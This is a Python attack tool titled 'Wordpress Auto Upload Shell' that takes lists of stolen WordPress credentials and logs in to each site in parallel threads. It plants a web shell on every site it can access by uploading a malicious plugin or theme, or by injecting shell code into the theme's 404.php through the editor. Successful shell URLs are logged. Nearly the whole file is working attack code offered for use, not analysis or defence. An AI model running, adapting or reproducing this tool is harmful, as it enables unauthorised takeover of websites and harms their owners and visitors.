import random, sys, os, time, requests, socket, re, datetime
from colorama import Fore, Back, Style, init
from multiprocessing.dummy import Pool
from bs4 import BeautifulSoup

try: from urllib.parse import urlparse
except ImportError: from urlparse import urlparse

error = []; uploaded = []

def logo ():
    colors = list(vars(Fore).values())
    os.system(["clear", "cls"][os.name == 'nt'])
    logo = """
Wordpress Auto Upload Shell http://site.com/wp-login.php#admin@pass 
Make sure u have zip shell that calls up.zip and up.php while run this toools to upload the shells and use format like xmlrpc bf logs
3 Ways uploading plugin, themes, filemanager for more free tools join @DailyToolz 

Credits : @CallMeRep
\n\n""".format(w=Fore.WHITE)
    for line in logo.splitlines():
        print("".join(colors[random.randint(1, len(colors)-1)] + line.format(w=Fore.WHITE, r=Fore.RED)))
        time.sleep(0.05)
logo()

class XwpUP:

    def __init__(self, site, user, password):
        self.result = []
        self.site = site; self.user = user; self.password = password
        self.session = requests.Session()
        self.session.headers.update({ "User-agent": "Mozila/5.0" })
        self.shellpath = {
            "4plugin": "up.zip",
            "4theme": "up.php"
        }

    def try2login (self):
        try:
            response = self.session.get(self.site + "wp-login.php")
            self.site = urlparse(response.url).scheme + "://" + urlparse(response.url).netloc + "/"
            data = { 
                "log": self.user, "pwd": self.password, 
                "rememberme": "forever", "testcookie": "1", "redirect_to": self.site + "wp-admin/",
                "wp-submit": re.findall('id="wp-submit" class="button button-primary button-large" value="(.*?)" />', response.text)[0]
            } 
            login = self.session.post(self.site + "wp-login.php", data = data)
            if "wp-admin/profile.php" in self.session.get(self.site + "wp-admin/").text: return 1
            return 0
        except: return 0

    def preupdata (self, url, ty):
        try:
            response = self.session.get(url)
            if not "wp-die-message" in response.text:
                action = re.findall('upload-form" action="(.*?)"', response.text)[0]
                nonceid, nonceval = re.findall('nonce" name="(.*?)" value="(.*?)" /><input', response.text)[0]
                data = {
                    nonceid: nonceval, 
                    "_wp_http_referer": re.findall('http_referer" value="(.*?)"', response.text)[0],
                    "install-" + ty + "-submit": re.findall(ty + '-submit" class="button" value="(.*?)"', response.text)[0]
                }; return action, data
            else: return 0
        except: return 0

    def upshell (self, ty):
        if ty == "plugin": 
            datafiles = { ty + "zip": open(self.shellpath['4plugin'], "rb") }
            up = self.preupdata(self.site + "wp-admin/plugin-install.php?tab=upload", ty)
        elif ty == "theme": 
            datafiles = { ty + "zip": open(self.shellpath['4theme'], "rb") }
            up = self.preupdata(self.site + "wp-admin/theme-install.php?browse=featured", ty)
        if up:
            upload = self.session.post(up[0], data = up[1], files = datafiles)
            if 'plugins.php?action=activate' in upload.text: return 1
            elif ty == "theme": return 1
        return 0

    def edittheme (self):
        response = self.session.get(self.site + "wp-admin/theme-editor.php?file=404.php")
        if "Update File" in response.text and not "wp-die-message" in response.text:
            code = BeautifulSoup(response.text, "html.parser").find(id="newcontent").get_text()
            injectedcode = open(self.shellpath['4theme'], "r").read() + code
            nonceid, nonceval = re.findall('nonce" name="(.*?)" value="(.*?)" /><input', response.text)[0]
            theme = re.findall('name="theme" value="(.*?)" />', response.text)[0]
            data = {
                nonceid: nonceval, "newcontent": injectedcode,
                "theme": theme,"file": "404.php", "action": "update"
            }
            inject = self.session.post(self.site + "wp-admin/theme-editor.php", data=data)
            if "nopebee7" in inject.text: return theme
            else: return ""
        else: return ""

    def execute (self):
        global uploaded
        url = self.site + "wp-login.php#" + self.user + "@" + self.password
        if self.try2login(): 
            if self.upshell("plugin"): updir = "wp-content/plugins/" + self.shellpath['4plugin'].replace(".zip", "") + "/up.php"
            elif self.upshell("theme"): 
                date = datetime.datetime.now()
                updir = "wp-content/uploads/{}/{}/".format(date.year, date.month) + "up.php"
            else:
                theme = self.edittheme()
                updir = "wp-content/themes/" + theme + "/404.php"
            response = self.session.get(self.site + updir)
            if "nopebee7" in response.text: uploaded.append(self.site); psucc(self.site + updir)
            else:
                open("trymanual.txt", "a").write(url + "\n")
                perr(url, "CANT UP")
        else:
            open("trymanual.txt", "a").write(url + "\n")
            perr(url, "CANT LOG")

def sfor (msg): return msg.format(w=Fore.WHITE, g=Fore.GREEN, y=Fore.YELLOW, r=Fore.RED)
def inpt (msg): return input(sfor("{w}[{g}+{w}] {y}"+str(msg)+" {w}> "))
def merr (msg): print(sfor("{w}[{r}x{w}] {y}"+str(msg)))
def perr (msg, info): print(Back.RED+" -- "+info+" -- \033[0m "+msg)
def psucc (url): print(Back.GREEN+" -- SUCCESS -- \033[0m "+url)

def opt ():
    listname = inpt("sites list")
    if os.path.exists(listname): sites = open(listname, "r").read().splitlines()
    else: merr("file not found in current dir"); exit()
    if sites == []: merr("empty file"); exit()
    threads = inpt("thread {w}({y}default{w}:{y}100{w})")
    if threads == "": threads = 10
    if len(sites) < int(threads): threads = round(len(sites) / 2)
    if int(threads) < 1: threads = 1
    return sites, int(threads)

def main (url):
    global error
    if not url.startswith("http"): url = "http://" + url
    uparse = urlparse( url )
    site = uparse.scheme + "://" + uparse.netloc + uparse.path.replace( "wp-login.php", "" )
    ufrag = uparse.fragment.split("@")
    username = ufrag[0]; password = ""
    for s in ufrag[1:]:
        if password == "": password += s
        else: password += "@" + s

    try:
        socket.gethostbyname( uparse.netloc )
        xwp = XwpUP( site, username, password )
        xwp.execute()
    except: error.append( site ); perr( url, "ERROR" )

if __name__ == "__main__":
    try: 
        options = opt(); print("\n")
        pool = Pool(options[1])
        pool.map(main, options[0])
        pool.close()
        pool.join()
        print("""
{w}[{g}+{w}] {y}uploaded {w}--> {u}
{w}[{g}+{w}] {y}error    {w}--> {e}
{w}[{g}+{w}] {y}done {w}>//<
        """.format(w=Fore.WHITE, g=Fore.GREEN, y=Fore.YELLOW, u=str(len(uploaded)), e=str(len(error))))
    except KeyboardInterrupt: print("\n [!] Goodbye >//< ")
